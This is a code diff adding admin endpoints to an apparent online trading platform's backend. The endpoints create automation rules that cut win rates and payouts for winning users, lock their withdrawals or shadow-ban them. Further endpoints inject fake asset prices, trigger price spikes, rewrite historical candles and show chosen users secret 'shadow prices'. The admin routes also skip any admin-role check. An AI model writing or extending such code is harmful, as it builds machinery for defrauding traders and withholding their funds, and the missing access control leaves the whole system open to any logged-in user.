@@ -5867,5 +5867,606 @@ async def get_user_segments(authorization: Optional[str] = Header(None), request
         "new_users_7d": new_users
     }
 
+# ============= AUTOMATION ENGINE =============
+
+class AutomationRule(BaseModel):
+    name: str
+    description: Optional[str] = None
+    trigger_type: str  # profit_threshold, win_streak, deposit_amount, withdrawal_request, loss_streak
+    trigger_value: float
+    trigger_operator: str = "gte"  # gte, lte, eq, gt, lt
+    action_type: str  # adjust_payout, adjust_winrate, flag_user, suspend_user, shadow_ban, send_alert, lock_withdrawals
+    action_value: Optional[float] = None
+    priority: int = 0
+    is_active: bool = True
+    target_segment: Optional[str] = None  # all, vip, new_users, high_rollers
+
+@api_router.get("/admin/automation/rules")
+async def get_automation_rules(
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Get all automation rules"""
+    admin = await get_current_user(authorization, request)
+    
+    rules = await db.automation_rules.find().sort("priority", -1).to_list(100)
+    
+    result = []
+    for rule in rules:
+        result.append({
+            "rule_id": rule.get("rule_id"),
+            "name": rule.get("name"),
+            "description": rule.get("description"),
+            "trigger_type": rule.get("trigger_type"),
+            "trigger_value": rule.get("trigger_value"),
+            "trigger_operator": rule.get("trigger_operator", "gte"),
+            "action_type": rule.get("action_type"),
+            "action_value": rule.get("action_value"),
+            "priority": rule.get("priority", 0),
+            "is_active": rule.get("is_active", True),
+            "target_segment": rule.get("target_segment", "all"),
+            "executions": rule.get("executions", 0),
+            "last_executed": rule.get("last_executed"),
+            "created_at": rule.get("created_at")
+        })
+    
+    return {"rules": result}
+
+@api_router.post("/admin/automation/rules")
+async def create_automation_rule(
+    rule: AutomationRule,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Create new automation rule"""
+    admin = await get_current_user(authorization, request)
+    
+    rule_data = {
+        "rule_id": str(uuid.uuid4()),
+        "name": rule.name,
+        "description": rule.description,
+        "trigger_type": rule.trigger_type,
+        "trigger_value": rule.trigger_value,
+        "trigger_operator": rule.trigger_operator,
+        "action_type": rule.action_type,
+        "action_value": rule.action_value,
+        "priority": rule.priority,
+        "is_active": rule.is_active,
+        "target_segment": rule.target_segment or "all",
+        "executions": 0,
+        "created_by": admin.get("user_id"),
+        "created_at": datetime.now(timezone.utc)
+    }
+    
+    await db.automation_rules.insert_one(rule_data)
+    
+    # Log action
+    await db.admin_logs.insert_one({
+        "log_id": str(uuid.uuid4()),
+        "admin_id": admin.get("user_id"),
+        "action": "create_automation_rule",
+        "details": {"rule_name": rule.name, "trigger": rule.trigger_type, "action": rule.action_type},
+        "timestamp": datetime.now(timezone.utc)
+    })
+    
+    return {"success": True, "rule_id": rule_data["rule_id"], "message": "Rule created"}
+
+@api_router.put("/admin/automation/rules/{rule_id}")
+async def update_automation_rule(
+    rule_id: str,
+    rule: AutomationRule,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Update automation rule"""
+    admin = await get_current_user(authorization, request)
+    
+    await db.automation_rules.update_one(
+        {"rule_id": rule_id},
+        {"$set": {
+            "name": rule.name,
+            "description": rule.description,
+            "trigger_type": rule.trigger_type,
+            "trigger_value": rule.trigger_value,
+            "trigger_operator": rule.trigger_operator,
+            "action_type": rule.action_type,
+            "action_value": rule.action_value,
+            "priority": rule.priority,
+            "is_active": rule.is_active,
+            "target_segment": rule.target_segment,
+            "updated_at": datetime.now(timezone.utc)
+        }}
+    )
+    
+    return {"success": True, "message": "Rule updated"}
+
+@api_router.delete("/admin/automation/rules/{rule_id}")
+async def delete_automation_rule(
+    rule_id: str,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Delete automation rule"""
+    admin = await get_current_user(authorization, request)
+    
+    await db.automation_rules.delete_one({"rule_id": rule_id})
+    
+    return {"success": True, "message": "Rule deleted"}
+
+@api_router.post("/admin/automation/rules/{rule_id}/toggle")
+async def toggle_automation_rule(
+    rule_id: str,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Toggle rule active status"""
+    admin = await get_current_user(authorization, request)
+    
+    rule = await db.automation_rules.find_one({"rule_id": rule_id})
+    if not rule:
+        raise HTTPException(status_code=404, detail="Rule not found")
+    
+    new_status = not rule.get("is_active", True)
+    await db.automation_rules.update_one(
+        {"rule_id": rule_id},
+        {"$set": {"is_active": new_status}}
+    )
+    
+    return {"success": True, "is_active": new_status}
+
+@api_router.post("/admin/automation/execute")
+async def execute_automation_rules(
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Manually execute all active automation rules"""
+    admin = await get_current_user(authorization, request)
+    
+    rules = await db.automation_rules.find({"is_active": True}).sort("priority", -1).to_list(100)
+    
+    results = []
+    for rule in rules:
+        affected = await execute_single_rule(rule)
+        results.append({
+            "rule_id": rule.get("rule_id"),
+            "name": rule.get("name"),
+            "affected_users": affected
+        })
+        
+        # Update execution count
+        await db.automation_rules.update_one(
+            {"rule_id": rule.get("rule_id")},
+            {"$inc": {"executions": 1}, "$set": {"last_executed": datetime.now(timezone.utc)}}
+        )
+    
+    return {"success": True, "results": results}
+
+async def execute_single_rule(rule: dict) -> int:
+    """Execute a single automation rule and return affected users count"""
+    trigger_type = rule.get("trigger_type")
+    trigger_value = rule.get("trigger_value", 0)
+    trigger_op = rule.get("trigger_operator", "gte")
+    action_type = rule.get("action_type")
+    action_value = rule.get("action_value")
+    target_segment = rule.get("target_segment", "all")
+    
+    # Build query based on trigger
+    query = {}
+    
+    if target_segment == "vip":
+        query["tier"] = "vip"
+    elif target_segment == "new_users":
+        week_ago = datetime.now(timezone.utc) - timedelta(days=7)
+        query["created_at"] = {"$gte": week_ago}
+    
+    # Get users to check
+    users = await db.users.find(query).to_list(1000)
+    
+    affected = 0
+    for user in users:
+        should_apply = False
+        
+        # Check trigger condition
+        if trigger_type == "profit_threshold":
+            trades = await db.trades.find({"user_id": user.get("user_id"), "status": {"$in": ["won", "lost"]}}).to_list(1000)
+            total_profit = sum(t.get("profit_loss", 0) for t in trades)
+            should_apply = compare_values(total_profit, trigger_value, trigger_op)
+            
+        elif trigger_type == "win_streak":
+            trades = await db.trades.find({"user_id": user.get("user_id")}).sort("created_at", -1).to_list(int(trigger_value) + 5)
+            streak = 0
+            for t in trades:
+                if t.get("status") == "won":
+                    streak += 1
+                else:
+                    break
+            should_apply = compare_values(streak, trigger_value, trigger_op)
+            
+        elif trigger_type == "deposit_amount":
+            deposits = await db.deposits.find({"user_id": user.get("user_id"), "status": "completed"}).to_list(100)
+            total_deposited = sum(d.get("amount_usd", 0) for d in deposits)
+            should_apply = compare_values(total_deposited, trigger_value, trigger_op)
+            
+        elif trigger_type == "loss_streak":
+            trades = await db.trades.find({"user_id": user.get("user_id")}).sort("created_at", -1).to_list(int(trigger_value) + 5)
+            streak = 0
+            for t in trades:
+                if t.get("status") == "lost":
+                    streak += 1
+                else:
+                    break
+            should_apply = compare_values(streak, trigger_value, trigger_op)
+        
+        # Apply action if condition met
+        if should_apply:
+            affected += 1
+            await apply_automation_action(user.get("user_id"), action_type, action_value, rule.get("rule_id"))
+    
+    return affected
+
+def compare_values(actual: float, target: float, operator: str) -> bool:
+    """Compare values based on operator"""
+    if operator == "gte":
+        return actual >= target
+    elif operator == "lte":
+        return actual <= target
+    elif operator == "gt":
+        return actual > target
+    elif operator == "lt":
+        return actual < target
+    elif operator == "eq":
+        return actual == target
+    return False
+
+async def apply_automation_action(user_id: str, action_type: str, action_value: Optional[float], rule_id: str):
+    """Apply automation action to a user"""
+    update = {}
+    
+    if action_type == "adjust_payout":
+        update["payout_modifier"] = action_value or 80
+    elif action_type == "adjust_winrate":
+        update["win_rate_modifier"] = action_value or 40
+    elif action_type == "flag_user":
+        update["is_flagged"] = True
+    elif action_type == "suspend_user":
+        update["account_status"] = "suspended"
+    elif action_type == "shadow_ban":
+        update["is_shadow_banned"] = True
+    elif action_type == "lock_withdrawals":
+        update["withdrawal_locked"] = True
+    
+    if update:
+        update["last_automation_rule"] = rule_id
+        update["last_automation_at"] = datetime.now(timezone.utc)
+        await db.users.update_one({"user_id": user_id}, {"$set": update})
+
+@api_router.get("/admin/automation/logs")
+async def get_automation_logs(
+    limit: int = 50,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Get automation execution logs"""
+    admin = await get_current_user(authorization, request)
+    
+    logs = await db.admin_logs.find(
+        {"action": {"$regex": "automation"}}
+    ).sort("timestamp", -1).limit(limit).to_list(limit)
+    
+    return {"logs": logs}
+
+# ============= MARKET & PRICE MANIPULATION =============
+
+class PriceInjection(BaseModel):
+    asset: str
+    price: float
+    duration_seconds: int = 60  # How long to maintain this price
+    affect_all_users: bool = True
+    target_user_ids: Optional[List[str]] = None
+
+class CandleEdit(BaseModel):
+    asset: str
+    timestamp: datetime
+    open_price: Optional[float] = None
+    close_price: Optional[float] = None
+    high_price: Optional[float] = None
+    low_price: Optional[float] = None
+
+class PriceSpike(BaseModel):
+    asset: str
+    direction: str  # up, down
+    percentage: float  # How much to move (e.g., 5 for 5%)
+    duration_ms: int = 1000  # How fast to move
+
+# Store active price manipulations in memory
+active_price_injections = {}
+shadow_prices = {}  # user_id -> {asset: price}
+
+@api_router.get("/admin/market/status")
+async def get_market_manipulation_status(
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Get current market manipulation status"""
+    admin = await get_current_user(authorization, request)
+    
+    # Get stored manipulations from DB
+    manipulations = await db.price_manipulations.find({"is_active": True}).to_list(50)
+    
+    # Get shadow prices
+    shadows = await db.shadow_prices.find({"is_active": True}).to_list(100)
+    
+    return {
+        "active_injections": [{
+            "asset": m.get("asset"),
+            "injected_price": m.get("price"),
+            "original_price": m.get("original_price"),
+            "expires_at": m.get("expires_at"),
+            "created_by": m.get("created_by")
+        } for m in manipulations],
+        "shadow_prices": [{
+            "user_id": s.get("user_id"),
+            "user_email": s.get("user_email"),
+            "asset": s.get("asset"),
+            "shadow_price": s.get("price"),
+            "market_price": s.get("market_price")
+        } for s in shadows],
+        "total_active_manipulations": len(manipulations),
+        "total_shadow_users": len(set(s.get("user_id") for s in shadows))
+    }
+
+@api_router.post("/admin/market/inject-price")
+async def inject_price(
+    injection: PriceInjection,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Inject a specific price for an asset"""
+    admin = await get_current_user(authorization, request)
+    
+    # Get current price
+    current_price = await get_asset_price(injection.asset)
+    
+    # Store manipulation
+    manipulation_data = {
+        "manipulation_id": str(uuid.uuid4()),
+        "asset": injection.asset,
+        "price": injection.price,
+        "original_price": current_price,
+        "duration_seconds": injection.duration_seconds,
+        "affect_all_users": injection.affect_all_users,
+        "target_user_ids": injection.target_user_ids,
+        "is_active": True,
+        "created_by": admin.get("user_id"),
+        "created_at": datetime.now(timezone.utc),
+        "expires_at": datetime.now(timezone.utc) + timedelta(seconds=injection.duration_seconds)
+    }
+    
+    await db.price_manipulations.insert_one(manipulation_data)
+    
+    # Update global price cache
+    active_price_injections[injection.asset] = {
+        "price": injection.price,
+        "expires_at": manipulation_data["expires_at"]
+    }
+    
+    # Log
+    await db.admin_logs.insert_one({
+        "log_id": str(uuid.uuid4()),
+        "admin_id": admin.get("user_id"),
+        "action": "price_injection",
+        "details": {
+            "asset": injection.asset,
+            "original_price": current_price,
+            "injected_price": injection.price,
+            "duration": injection.duration_seconds
+        },
+        "timestamp": datetime.now(timezone.utc)
+    })
+    
+    return {"success": True, "message": f"Price injected: {injection.asset} = ${injection.price}"}
+
+@api_router.post("/admin/market/clear-injection")
+async def clear_price_injection(
+    asset: str,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Clear price injection for an asset"""
+    admin = await get_current_user(authorization, request)
+    
+    await db.price_manipulations.update_many(
+        {"asset": asset, "is_active": True},
+        {"$set": {"is_active": False, "cleared_at": datetime.now(timezone.utc)}}
+    )
+    
+    if asset in active_price_injections:
+        del active_price_injections[asset]
+    
+    return {"success": True, "message": f"Price injection cleared for {asset}"}
+
+@api_router.post("/admin/market/edit-candle")
+async def edit_candle(
+    edit: CandleEdit,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Edit historical candle data"""
+    admin = await get_current_user(authorization, request)
+    
+    update = {}
+    if edit.open_price is not None:
+        update["open"] = edit.open_price
+    if edit.close_price is not None:
+        update["close"] = edit.close_price
+    if edit.high_price is not None:
+        update["high"] = edit.high_price
+    if edit.low_price is not None:
+        update["low"] = edit.low_price
+    
+    if update:
+        update["edited_by"] = admin.get("user_id")
+        update["edited_at"] = datetime.now(timezone.utc)
+        
+        # Store candle edit
+        await db.candle_edits.insert_one({
+            "edit_id": str(uuid.uuid4()),
+            "asset": edit.asset,
+            "timestamp": edit.timestamp,
+            "changes": update,
+            "created_by": admin.get("user_id"),
+            "created_at": datetime.now(timezone.utc)
+        })
+    
+    return {"success": True, "message": "Candle edited"}
+
+@api_router.post("/admin/market/price-spike")
+async def trigger_price_spike(
+    spike: PriceSpike,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Trigger an instant price spike/drop"""
+    admin = await get_current_user(authorization, request)
+    
+    current_price = await get_asset_price(spike.asset)
+    
+    if spike.direction == "up":
+        new_price = current_price * (1 + spike.percentage / 100)
+    else:
+        new_price = current_price * (1 - spike.percentage / 100)
+    
+    # Store spike data
+    await db.price_spikes.insert_one({
+        "spike_id": str(uuid.uuid4()),
+        "asset": spike.asset,
+        "direction": spike.direction,
+        "percentage": spike.percentage,
+        "original_price": current_price,
+        "spike_price": new_price,
+        "duration_ms": spike.duration_ms,
+        "created_by": admin.get("user_id"),
+        "created_at": datetime.now(timezone.utc)
+    })
+    
+    # Temporarily inject the spike price
+    active_price_injections[spike.asset] = {
+        "price": new_price,
+        "expires_at": datetime.now(timezone.utc) + timedelta(milliseconds=spike.duration_ms)
+    }
+    
+    return {
+        "success": True,
+        "message": f"Price spike triggered: {spike.asset} {spike.direction} {spike.percentage}%",
+        "original_price": current_price,
+        "spike_price": new_price
+    }
+
+@api_router.post("/admin/market/shadow-price")
+async def set_shadow_price(
+    user_id: str,
+    asset: str,
+    price: float,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Set a shadow price for a specific user (they see different price)"""
+    admin = await get_current_user(authorization, request)
+    
+    user = await db.users.find_one({"user_id": user_id})
+    if not user:
+        raise HTTPException(status_code=404, detail="User not found")
+    
+    market_price = await get_asset_price(asset)
+    
+    # Store shadow price
+    await db.shadow_prices.update_one(
+        {"user_id": user_id, "asset": asset},
+        {"$set": {
+            "user_id": user_id,
+            "user_email": user.get("email"),
+            "asset": asset,
+            "price": price,
+            "market_price": market_price,
+            "is_active": True,
+            "created_by": admin.get("user_id"),
+            "updated_at": datetime.now(timezone.utc)
+        }},
+        upsert=True
+    )
+    
+    return {"success": True, "message": f"Shadow price set for {user.get('email')}: {asset} = ${price}"}
+
+@api_router.delete("/admin/market/shadow-price")
+async def remove_shadow_price(
+    user_id: str,
+    asset: str,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Remove shadow price for a user"""
+    admin = await get_current_user(authorization, request)
+    
+    await db.shadow_prices.delete_one({"user_id": user_id, "asset": asset})
+    
+    return {"success": True, "message": "Shadow price removed"}
+
+@api_router.get("/admin/market/history")
+async def get_manipulation_history(
+    limit: int = 50,
+    authorization: Optional[str] = Header(None),
+    request: Request = None
+):
+    """Get history of all market manipulations"""
+    admin = await get_current_user(authorization, request)
+    
+    injections = await db.price_manipulations.find().sort("created_at", -1).limit(limit).to_list(limit)
+    spikes = await db.price_spikes.find().sort("created_at", -1).limit(limit).to_list(limit)
+    edits = await db.candle_edits.find().sort("created_at", -1).limit(limit).to_list(limit)
+    
+    return {
+        "injections": injections,
+        "spikes": spikes,
+        "candle_edits": edits
+    }
+
+async def get_asset_price(asset: str) -> float:
+    """Get current price for an asset (check for active injections first)"""
+    # Check for active injection
+    if asset in active_price_injections:
+        injection = active_price_injections[asset]
+        if datetime.now(timezone.utc) < injection["expires_at"]:
+            return injection["price"]
+        else:
+            del active_price_injections[asset]
+    
+    # Get from DB or generate
+    price_data = await db.asset_prices.find_one({"symbol": asset})
+    if price_data:
+        return price_data.get("current_price", 1.0)
+    
+    # Default prices for common assets
+    default_prices = {
+        "BTCUSD": 65000,
+        "ETHUSD": 3500,
+        "EURUSD": 1.08,
+        "GBPUSD": 1.26,
+        "USDJPY": 150,
+        "GOLD": 2350,
+        "AAPL": 175,
+        "GOOGL": 140
+    }
+    return default_prices.get(asset, 100)
+
+async def get_user_price(user_id: str, asset: str) -> float:
+    """Get price for a specific user (checks shadow prices)"""
+    # Check for shadow price
+    shadow = await db.shadow_prices.find_one({"user_id": user_id, "asset": asset, "is_active": True})
+    if shadow:
+        return shadow.get("price")
+    
+    # Return normal price
+    return await get_asset_price(asset)
+
 # Include router - MUST be at the end of file after ALL route definitions
 app.include_router(api_router)
